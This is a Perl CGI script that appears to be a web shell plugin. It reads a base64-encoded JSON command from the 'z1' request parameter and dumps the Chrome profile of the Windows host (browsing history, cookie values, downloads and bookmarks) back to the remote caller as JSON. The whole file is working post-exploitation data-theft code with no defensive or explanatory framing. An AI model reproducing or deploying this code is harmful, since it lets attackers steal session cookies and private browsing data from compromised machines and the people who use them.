use strict;
use warnings;
use CGI;
use MIME::Base64;
use JSON;
use DBI;
use File::Copy;
use File::Spec;
use File::Temp qw(tempfile);

our $chrome_base = '';
our $profile_dir = 'Default';
our $chrome_dir  = '';

sub dump_history {
    my $history_file = File::Spec->catfile($chrome_dir, 'History');
    return [] unless -f $history_file;

    my ($fh, $dst) = tempfile(UNLINK => 0, SUFFIX => '.tmp');
    close($fh);
    return [] unless copy($history_file, $dst);

    my @results = ();
    my $dbh = eval { DBI->connect("dbi:SQLite(RaiseError=>1, PrintError=>0):dbname=$dst", "", "") };
    if ($dbh) {
        my $sth = eval { $dbh->prepare("SELECT url, title, last_visit_time FROM urls") };
        if ($sth && $sth->execute()) {
            while (my $row = $sth->fetchrow_hashref()) {
                push @results, {
                    'URL'      => $row->{'url'} // '',
                    'Title'    => $row->{'title'} // '',
                    'LastUsed' => $row->{'last_visit_time'} // 0
                };
            }
        }
        $dbh->disconnect();
    }
    unlink($dst) if -f $dst;
    return \@results;
}

sub dump_cookie {
    my $cookie_file = File::Spec->catfile($chrome_dir, 'Network', 'Cookies');
    unless (-f $cookie_file) {
        $cookie_file = File::Spec->catfile($chrome_dir, 'Cookies');
    }
    return [] unless -f $cookie_file;

    my ($fh, $dst) = tempfile(UNLINK => 0, SUFFIX => '.tmp');
    close($fh);
    return [] unless copy($cookie_file, $dst);

    my @results = ();
    my $dbh = eval { DBI->connect("dbi:SQLite(RaiseError=>1, PrintError=>0):dbname=$dst", "", "") };
    if ($dbh) {
        my $sth = eval { $dbh->prepare("SELECT host_key, name, value FROM cookies") };
        if ($sth && $sth->execute()) {
            while (my $row = $sth->fetchrow_hashref()) {
                push @results, {
                    'Host'  => $row->{'host_key'} // '',
                    'Name'  => $row->{'name'} // '',
                    'Value' => $row->{'value'} // ''
                };
            }
        }
        $dbh->disconnect();
    }
    unlink($dst) if -f $dst;
    return \@results;
}

sub dump_download {
    my $history_file = File::Spec->catfile($chrome_dir, 'History');
    return [] unless -f $history_file;

    my ($fh, $dst) = tempfile(UNLINK => 0, SUFFIX => '.tmp');
    close($fh);
    return [] unless copy($history_file, $dst);

    my @results = ();
    my $dbh = eval { DBI->connect("dbi:SQLite(RaiseError=>1, PrintError=>0):dbname=$dst", "", "") };
    if ($dbh) {
        my $sth = eval { $dbh->prepare("SELECT target_path, tab_url, total_bytes, start_time FROM downloads") };
        if ($sth && $sth->execute()) {
            while (my $row = $sth->fetchrow_hashref()) {
                push @results, {
                    'FileName'   => $row->{'target_path'} // '',
                    'TargetPath' => $row->{'target_path'} // '',
                    'URL'        => $row->{'tab_url'} // '',
                    'Length'     => int($row->{'total_bytes'} // 0),
                    'Date'       => $row->{'start_time'} // ''
                };
            }
        }
        $dbh->disconnect();
    }
    unlink($dst) if -f $dst;
    return \@results;
}

sub parse_bookmarks_node {
    my ($node, $results) = @_;
    return unless ref($node) eq 'HASH';

    if (exists $node->{'type'} && $node->{'type'} eq 'url') {
        push @$results, {
            'name' => $node->{'name'} // '',
            'url'  => $node->{'url'} // ''
        };
    }

    if (exists $node->{'children'} && ref($node->{'children'}) eq 'ARRAY') {
        foreach my $child (@{$node->{'children'}}) {
            parse_bookmarks_node($child, $results);
        }
    }
}

sub dump_bookmark {
    my $bookmark_file = File::Spec->catfile($chrome_dir, 'Bookmarks');
    return [] unless -f $bookmark_file;

    my @results = ();
    eval {
        local $/;
        open my $fh, '<:encoding(UTF-8)', $bookmark_file or return;
        my $content = <$fh>;
        close $fh;

        my $json = decode_json($content);
        if (ref($json) eq 'HASH' && exists $json->{'roots'} && ref($json->{'roots'}) eq 'HASH') {
            foreach my $root_key (keys %{$json->{'roots'}}) {
                parse_bookmarks_node($json->{'roots'}->{$root_key}, \@results);
            }
        }
    };

    return \@results;
}

sub do_init {
    my $appdata = $ENV{'LOCALAPPDATA'} // $ENV{'APPDATA'};
    unless ($appdata) {
        $appdata = $ENV{'USERPROFILE'} ? $ENV{'USERPROFILE'} . '\\AppData\\Local' : '';
    }
    return 0 unless $appdata;

    $chrome_base = File::Spec->catdir($appdata, 'Google', 'Chrome', 'User Data');
    return -d $chrome_base ? 1 : 0;
}

sub main {
    my @drivers = DBI->available_drivers();
    unless (grep { $_ eq 'SQLite' } @drivers) {
        return '[-] pdo_sqlite (DBD::SQLite) is unavailable.';
    }

    return '[-] Initialization failed: ' . $chrome_base unless do_init();

    my $z1_param = $cgi->param('z1');
    return '[-] Invalid JSON / Base64.' unless $z1_param;

    my $decoded_json = eval { decode_json(decode_base64($z1_param)) };
    return '[-] Invalid JSON / Base64.' if $@ || !defined $decoded_json;

    my $action  = $decoded_json->{'action'} // '';
    my $profile = $decoded_json->{'profile'} // 'Default';

    $profile_dir = $profile;
    $chrome_dir  = File::Spec->catdir($chrome_base, $profile);

    my $response = {
        'status' => 'success',
        'action' => $action,
        'data'   => []
    };

    if ($action eq 'history') {
        $response->{'data'} = dump_history();
    } elsif ($action eq 'cookie') {
        $response->{'data'} = dump_cookie();
    } elsif ($action eq 'download') {
        $response->{'data'} = dump_download();
    } elsif ($action eq 'bookmark') {
        $response->{'data'} = dump_bookmark();
    } else {
        return '[-] Unknown action: ' . $action;
    }

    my $json_encoder = JSON->new->utf8->canonical;
    return $json_encoder->encode($response);
}

print main();